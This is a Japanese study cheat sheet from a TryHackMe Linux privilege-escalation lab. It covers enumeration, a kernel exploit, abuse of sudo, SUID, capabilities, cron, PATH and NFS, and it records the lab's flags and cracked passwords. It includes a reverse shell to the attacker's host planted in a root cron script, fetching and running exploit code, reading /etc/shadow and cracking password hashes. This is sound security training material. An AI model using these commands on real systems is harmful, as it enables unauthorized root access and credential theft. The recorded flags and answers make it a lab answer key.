# Linux Privilege Escalation チートシート

> TryHackMe「Linux PrivEsc」ルーム学習記録  
> 作成日: 2026-04-09

---

## 🔍 情報収集（Enumeration）

| コマンド | 用途 |
|---|---|
| `hostname` | ホスト名確認 |
| `uname -a` | カーネルバージョン確認 |
| `cat /proc/version` | カーネル詳細情報 |
| `cat /etc/issue` | OSディストリビューション確認 |
| `python --version` | Pythonバージョン確認 |
| `python3 --version` | Python3バージョン確認 |
| `sudo -l` | sudo権限の確認 |
| `id` | 現在のユーザーとグループ確認 |
| `cat /etc/passwd` | ユーザー一覧確認 |
| `cat /etc/shadow` | パスワードハッシュ確認（root権限必要） |
| `ps -A` | 全プロセス確認 |
| `env` | 環境変数確認 |
| `history` | コマンド履歴確認 |
| `ifconfig` | ネットワークインターフェース確認 |
| `ip route` | ルーティングテーブル確認 |
| `netstat -ano` | ネットワーク接続確認 |

---

## 🐧 Kernel Exploit（Task 5）

### 手順
1. カーネルバージョン確認
2. searchsploitで脆弱性検索
3. エクスプロイトをターゲットに転送してコンパイル・実行

### コマンド

```bash
# カーネルバージョン確認
uname -a

# 脆弱性検索
searchsploit "linux kernel 3.13" ubuntu local privilege

# エクスプロイトの詳細確認
searchsploit -x linux/local/37292.c

# Kaliでファイルサーバー起動
python3 -m http.server 8000

# ターゲット上でダウンロード・コンパイル・実行
cd /tmp
wget http://<KaliのIP>:8000/37292.c
gcc 37292.c -o ofs
./ofs
```

### 今回の結果
- CVE: `CVE-2015-1328`（overlayfs）
- カーネル: `3.13.0-24-generic` / Ubuntu 14.04
- Flag: `THM-28392872729920`

---

## 👑 Sudo（Task 6）

### 手順
1. `sudo -l` でsudo権限のあるコマンドを確認
2. GTFOBins（https://gtfobins.github.io）で悪用方法を確認

### コマンド

```bash
# sudo権限確認
sudo -l

# findでroot shell取得
sudo find . -exec /bin/bash \; -quit

# nanoでファイル読み取り
sudo nano /etc/shadow

# lessでファイル読み取り
sudo less /etc/shadow
```

### 今回の結果
- sudo権限: `find`, `less`, `nano`（3つ）
- Flag: `THM-402028394`
- Mattのパスワード: `123456`

---

## 🔑 SUID（Task 7）

### 手順
1. SUIDビットが設定されたファイルを検索
2. GTFOBinsで悪用方法を確認
3. base64でファイル読み取り or unshadow+Johnでパスワードクラック

### コマンド

```bash
# SUIDファイル検索
find / -type f -perm -04000 -ls 2>/dev/null

# base64でroot権限が必要なファイルを読む
base64 /etc/shadow | base64 -d
base64 /etc/passwd | base64 -d

# unshadowでファイルを結合
unshadow passwd.txt shadow.txt > passwords.txt

# John the Ripperでクラック
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

### 今回の結果
- 悪用したSUID: `base64`
- Flag: `THM-3847834`
- user2のパスワード: `Password1`

---

## ⚡ Capabilities（Task 8）

### 手順
1. `getcap`でCapabilitiesを確認
2. `cap_setuid`が設定されたバイナリを悪用

### コマンド

```bash
# Capabilities確認
getcap -r / 2>/dev/null

# vimのcap_setuidを悪用してroot shell取得
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### 主なCapabilityの種類
| Capability | 意味 |
|---|---|
| `cap_setuid` | UIDを変更できる（権限昇格に悪用可） |
| `cap_net_raw` | rawソケットを使える |
| `cap_net_bind_service` | 1024以下のポートをバインドできる |

### 今回の結果
- 悪用したバイナリ: `vim`（`cap_setuid+ep`）
- 他に使えるバイナリ: `view`
- Flag: `THM-9349843`

---

## ⏰ Cron Jobs（Task 9）

### 手順
1. `/etc/crontab`でcron jobを確認
2. root権限で実行されるスクリプトを書き換えてリバースシェルを仕込む
3. Kaliでncリスナーを起動して接続を待つ

### コマンド

```bash
# crontab確認
cat /etc/crontab

# リバースシェルをスクリプトに書き込む
echo '#!/bin/bash' > /home/karen/backup.sh
echo 'bash -i >& /dev/tcp/<KaliのIP>/6666 0>&1' >> /home/karen/backup.sh
chmod +x /home/karen/backup.sh

# Kaliでリスナー起動
nc -nlvp 6666
```

### リバースシェルの仕組み
```
Kali（nc -nlvp 6666で待機）
        ↑
ターゲット（cron jobがスクリプトを毎分実行）
        ↓
bash -i >& /dev/tcp/<KaliのIP>/6666 0>&1
        ↓
root権限のシェルがKaliに接続！
```

### 今回の結果
- ユーザー定義cron job数: `4`
- Flag: `THM-383000283`
- Mattのパスワード: `123456`

---

## 🛤️ PATH Hijacking（Task 10）

### 手順
1. 書き込み可能なフォルダを確認
2. SUIDバイナリが絶対パスなしでコマンドを呼び出しているか確認
3. PATHの先頭に書き込み可能フォルダを追加して偽コマンドを作成

### コマンド

```bash
# 書き込み可能フォルダ確認
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# PATHに追加
export PATH=/home/murdoch:$PATH

# 偽コマンド作成
echo "/bin/bash" > /home/murdoch/thm
chmod 777 /home/murdoch/thm

# SUIDバイナリ実行
/home/murdoch/test
```

### 今回の結果
- 書き込み可能な変わったフォルダ: `/home/murdoch`
- Flag: `THM-736628929`

---

## 🌐 NFS（Task 11）

### 手順
1. `showmount`でマウント可能なシェアを確認
2. `no_root_squash`が設定されているシェアをマウント
3. SUIDビット付きのバイナリをKaliで作成
4. ターゲット上で実行してroot取得

### コマンド

```bash
# マウント可能なシェア確認
showmount -e <ターゲットIP>

# /etc/exportsでno_root_squash確認
cat /etc/exports

# Kaliでマウント
sudo mkdir /tmp/nfsmount
sudo mount -o rw <ターゲットIP>:/tmp /tmp/nfsmount

# SUIDバイナリ作成（Kali上）
cat > /tmp/nfsmount/nfs.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
EOF
sudo gcc /tmp/nfsmount/nfs.c -o /tmp/nfsmount/nfs -w -static
sudo chmod +s /tmp/nfsmount/nfs

# ターゲット上で実行
/tmp/nfs
```

### 今回の結果
- マウント可能なシェア数: `3`
- no_root_squash有効数: `3`
- Flag: `THM-89384012`

---

## 🏆 Capstone Challenge（Task 12）

### 使った手法の組み合わせ
1. **SUID（base64）** → `/etc/shadow`を読む
2. **John the Ripper** → missyのパスワードクラック
3. **sudo find** → root shell取得

```bash
# base64でshadow読み取り
base64 /etc/shadow | base64 -d

# Johnでクラック
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# sudo findでroot shell
sudo find . -exec /bin/bash \; -quit
```

### 結果
- missyのパスワード: `Password1`
- Flag1: `THM-42828719920544`
- Flag2: `THM-168824782390238`

---

## 🔧 よく使うツール

| ツール | 用途 |
|---|---|
| `searchsploit` | エクスプロイト検索 |
| `john` | パスワードクラック |
| `hashcat` | パスワードクラック（GPU） |
| `nc` | リバースシェルのリスナー |
| `getcap` | Capabilities確認 |
| `showmount` | NFSシェア確認 |
| `unshadow` | passwd+shadowの結合 |

## 📚 参考リンク

- GTFOBins: https://gtfobins.github.io
- CVE Details: https://www.cvedetails.com
- TryHackMe: https://tryhackme.com
